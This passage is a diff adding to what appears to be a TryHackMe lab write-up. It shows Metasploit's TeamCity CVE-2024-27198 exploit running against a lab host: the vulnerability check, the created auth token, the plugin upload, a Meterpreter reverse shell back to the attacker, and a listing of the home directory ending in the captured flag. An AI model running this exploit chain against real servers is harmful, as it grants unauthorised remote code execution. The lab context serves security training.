@@ -88,3 +88,48 @@ LHOST => 10.8.31.47
 
 and i got shell : 
 
+```js
+msf](Jobs:0 Agents:0) exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) >> exploit 
+[*] Started reverse TCP handler on 10.8.31.47:4445 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
+[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.cUdvN1duVmp3RVJQal9aZ2IyTUVCLVExQmRF.OTVkY2U3YzEtZjgwZC00MzIwLWI5ZmUtZjFmN2ZjODZkYzdm
+[*] Uploading plugin: ZPYR1Toq
+[*] Sending stage (58073 bytes) to 10.201.63.63
+[*] Deleting the plugin...
+[*] Deleting the authentication token...
+[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_ZPYR1Toq
+[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/ZPYR1Toq
+[*] Meterpreter session 2 opened (10.8.31.47:4445 -> 10.201.63.63:40768) at 2025-11-01 12:59:30 +0000
+[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/ZPYR1Toq' on the target
+
+(Meterpreter 2)(/opt/teamcity/TeamCity/bin) >
+
+```
+
+and found flag in `/home/ubuntu`
+
+```js
+(Meterpreter 2)(/home/ubuntu) > ls
+Listing: /home/ubuntu
+=====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  4096  dir   2025-11-01 11:54:58 +0000  .BuildServer
+000667/rw-rw-rwx  0     fif   2025-11-01 11:52:59 +0000  .bash_history
+100667/rw-rw-rwx  220   fil   2020-02-25 12:03:22 +0000  .bash_logout
+100667/rw-rw-rwx  3771  fil   2020-02-25 12:03:22 +0000  .bashrc
+040777/rwxrwxrwx  4096  dir   2024-07-02 09:39:13 +0000  .cache
+040777/rwxrwxrwx  4096  dir   2024-08-02 08:54:48 +0000  .config
+040777/rwxrwxrwx  4096  dir   2024-07-02 09:40:18 +0000  .local
+100667/rw-rw-rwx  807   fil   2020-02-25 12:03:22 +0000  .profile
+100667/rw-rw-rwx  66    fil   2024-07-02 09:59:35 +0000  .selected_editor
+040777/rwxrwxrwx  4096  dir   2024-07-02 09:38:50 +0000  .ssh
+100667/rw-rw-rwx  0     fil   2024-07-02 09:39:21 +0000  .sudo_as_admin_successful
+100667/rw-rw-rwx  214   fil   2024-07-02 09:46:35 +0000  .wget-hsts
+100666/rw-rw-rw-  38    fil   2025-11-01 13:13:38 +0000  flag.txt
+
+(Meterpreter 2)(/home/ubuntu) > cat flag.txt
+THM{faa9bac345709b6620a6200b484c7594}
+```
